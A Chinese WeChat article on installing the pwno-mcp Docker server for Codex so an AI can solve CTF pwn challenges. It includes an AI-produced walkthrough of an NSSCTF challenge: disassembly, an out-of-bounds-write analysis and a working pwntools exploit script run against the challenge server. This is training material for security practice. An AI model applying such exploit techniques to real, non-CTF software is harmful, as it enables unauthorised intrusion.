---
title: 安装pwno-mcp，让AI自动解PWN题
url: https://mp.weixin.qq.com/s/-UHmS-38FcVuaWS3Xoe5rw
source: Doonsec's feed
date: 2026-03-17
fetch_date: 2026-03-18T04:17:57.530008
---

# 安装pwno-mcp，让AI自动解PWN题

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/FT3A8r9icDykvyue5GyU42tUDvxmZcg5IicpmUQjo6nSlhAPX7EWMGnwuZuQCcQng3Jt7Xf5aXtbN6qMdkFh87XiaNsbWlf2y5v859kicJy81rs/0?wx_fmt=jpeg)

# 安装pwno-mcp，让AI自动解PWN题

原创

凉城
凉城

ListSec

![]()

在小说阅读器中沉浸阅读

作为一个pwn小白，尝试用AI来解pwn题，找到一个pwn mcp，地址：https://docs.pwno.io/quickstart。

## 一、前提条件

* • 本机已安装 `Docker`，或者使用 `OrbStack` 提供 Docker 兼容环境。
* • 本机已安装 `Codex`。
* • 你准备挂载给 `pwno-mcp` 使用的工作目录已经确定。

本次实测环境中，工作目录挂载为：

```
/Users/lca/Documents/New project
```

容器内对应物理机器的路径为：

```
/workspace
```

后续在 `pwno-mcp` 工具里传参时，路径要写容器内路径，例如：

```
/workspace/chal
```

不要直接传宿主机绝对路径。

## 二、在 Codex 中添加 MCP 配置

编辑 `~/.codex/config.toml`，追加下面这段：

```
[mcp_servers.pwno-mcp]
url = "http://127.0.0.1:5500/mcp"
```

这一步只是告诉 Codex 去哪里连接 `pwno-mcp`。真正的服务还需要通过 Docker 启动。

可以用下面的命令检查配置是否已被识别：

```
codex mcp list
```

如果配置正确，输出里会出现：

```
pwno-mcp  http://127.0.0.1:5500/mcp
```

## 三、启动 pwno-mcp 容器

官方文档建议使用 Docker 启动，并保留所需能力与安全参数。实测可用命令如下：

```
docker run -d \
  --platform linux/amd64 \
  --name pwno-mcp \
  -p 127.0.0.1:5500:5500 \
  --cap-add=SYS_PTRACE \
  --cap-add=SYS_ADMIN \
  --security-opt seccomp=unconfined \
  --security-opt apparmor=unconfined \
  -v "/Users/lca/Documents/New project:/workspace" \
  ghcr.io/pwno-io/pwno-mcp:latest
```

### 参数说明

* • `--name pwno-mcp`：固定容器名称，便于后续查看日志和重启。
* • `-p 127.0.0.1:5500:5500`：把本地 `5500` 端口映射到容器。
* • `--cap-add=SYS_PTRACE`、`--cap-add=SYS_ADMIN`：保留调试和分析所需能力。
* • `--security-opt seccomp=unconfined`、`--security-opt apparmor=unconfined`：保持和官方 Quick Start 一致。
* • `-v "宿主机目录:/workspace"`：把本地目录挂载到容器内。

**注意：**

我的电脑是M1 MAC，所以在启动时加上：

```
--platform linux/amd64
```

## 四、验证服务是否启动成功

先检查容器状态：

```
docker ps --filter name=pwno-mcp
```

正常情况下应能看到类似结果：

```
pwno-mcp   Up ...   127.0.0.1:5500->5500/tcp
```

再检查健康接口：

```
curl http://127.0.0.1:5500/healthz
```

如果启动成功，应返回：

```
{"status":"ok"}
```

**最简单的安装方式**

直接告诉codex：`参考https://docs.pwno.io/quickstart内容，安装pwno-mcp`。

**如何使用这个mcp？**

将pwn题给的附件放到挂载目录下，然后告诉codex，题目链接及附件的位置，就会开始解题。

---

案例：

题目地址：https://www.nssctf.cn/problem/2330，下面是AI的解题步骤。

## 1. 保护机制与基础信息搜集

运行 `checksec` 获取了如下保护信息：

* • **Arch**: amd64
* • **RELRO**: Partial RELRO
* • **Stack**: No canary found
* • **NX**: NX enabled
* • **PIE**: No PIE (0x400000)

程序未开启 PIE，这意味着静态地址在运行时是固定的。通过 `info functions` 我们可以看到标准的 `main` 函数以及各种常见的导入函数，比如 `scanf`, `puts`, `printf`。

## 2. 逆向分析漏洞点 (`main` 函数)

通过对 `main` 函数汇编代码进行阅读，我们主要梳理出了程序的执行流程：

1. 1. **第一次输入/越界索引读取**：
   `scanf("%d", &v)` 读取一个整数到局部栈变量（相对于 `rbp` 的偏移是栈上的局部变量，这里用于当做数组的索引，记作 `index`）。
2. 2. **第二次输入/任意地址写（漏洞点）**：

汇编：

```
0x000000000040074a: mov eax, DWORD PTR [rbp-0x4]   ; 获取第一次输入的索引
0x000000000040074f: shl rax, 0x2                   ; 索引乘以 4 (相当于 int 数组偏移)
0x0000000000400753: add rax, 0x6010a0              ; 加上基地址 0x6010a0
...
0x0000000000400766: call 0x400580 <__isoc99_scanf@plt>
```

程序在此构造出了寻址公式 `0x6010a0 + index * 4` 并调用了 `scanf`。由于上一步的 `%d` 并未检查正负数和大小，这构成了一个典型的**数组越界写（Out-Of-Bounds Write）** 漏洞，进而允许我们修改程序内存空间中的数据（任意地址写）。

1. 3. **后门逻辑（触发 Flag）**：

   ```
   0x000000000040076b: mov eax, DWORD PTR [rip+0x2008f7] # 获取全局变量 a (0x601068) 的值
   0x0000000000400771: test eax, eax
   0x0000000000400773: jne 0x400784
   ...
   0x000000000040077a: mov edi, 0x601050
   0x000000000040077f: call 0x400550 <printf@plt>  ; 输出 0x601050 位置的字符串 (flag)
   ```

可以看出，只要让 `0x601068` (全局变量 `a`) 的值为 `0`，程序就会直接调用 `printf(flag)`。经过查阅内存，发现变量 `a` 默认被硬编码成了非零的 `1`，而 `flag` 存放在 `0x601050`。

## 3. Exploit Payload 构建

我们利用上边说的第二步 OOB 写漏洞，使目标地址等于变量 `a` 的地址：

* • 目标写入地址：`a` 地址为 `0x601068`
* • 数组起始地址：`0x6010a0`
* • 数据单位大小：4字节

计算所需输入的负数索引：

```
index = (0x601068 - 0x6010a0) / 4
index = -0x38 / 4
index = -56 / 4
index = -14
```

因此，漏洞利用逻辑为：

1. 1. 当程序等待输入 `index` 时，输入 `-14`。
2. 2. 当程序等待输入 `value` 时，输入 `0`。

## 4. 远程验证结果

使用 pwntools 或者 pwncli 编写自动化脚本：

```
from pwn import *

defexploit():
# 连接远程
    conn = remote("node4.anna.nssctf.cn", 27360)

# 接收初始输出
# print(conn.recv().decode())

# 根据分析，输入负数索引-14，可以越界访问到变量a (0x601068)
# 因为 scanf 写入的目标地址是 0x6010a0 + index * 4
    conn.sendline(b"-14")

# scanf("input again") 或者其他提示
# print(conn.recv().decode())

# 输入0，将变量a覆写为0，通过 jne 的检查，触发 printf(flag)
    conn.sendline(b"0")

# 获取输出结果（通常包含flag）
    output = conn.recvall(timeout=2)
print("RESULT:", output)

if __name__ == "__main__":
    exploit()
```

执行结果如下：

```
[+] Opening connection to node4.anna.nssctf.cn on port 27360: Done
[x] Receiving all data
[+] Receiving all data: Done (257B)
[*] Closed connection to node4.anna.nssctf.cn port 27360
RESULT: b' ____  _   _  ____ _____ _____ \n/ ___|| | | |/ ___|_   _|  ___|\n\\___ \\| | | | |     | | | |_   \n ___) | |_| | |___  | | |  _|  \n|____/ \\___/ \\____| |_| |_|    \n                               \n============================\nindex:\nvalue:\nNSSCTF{baby_arr@yxxxx}'
```

**Flag**：`NSSCTF{baby_arr@yxxxx}`

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/GPsT7FaPGw5uQIpWOXmtw3tpIcv79XQaeOzFgThibkpMw28zSicDFgOumVJfHnfM533DBb7ibM1KnqkShD3Wtt3BA/0?wx_fmt=png)

ListSec

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/GPsT7FaPGw5uQIpWOXmtw3tpIcv79XQaeOzFgThibkpMw28zSicDFgOumVJfHnfM533DBb7ibM1KnqkShD3Wtt3BA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过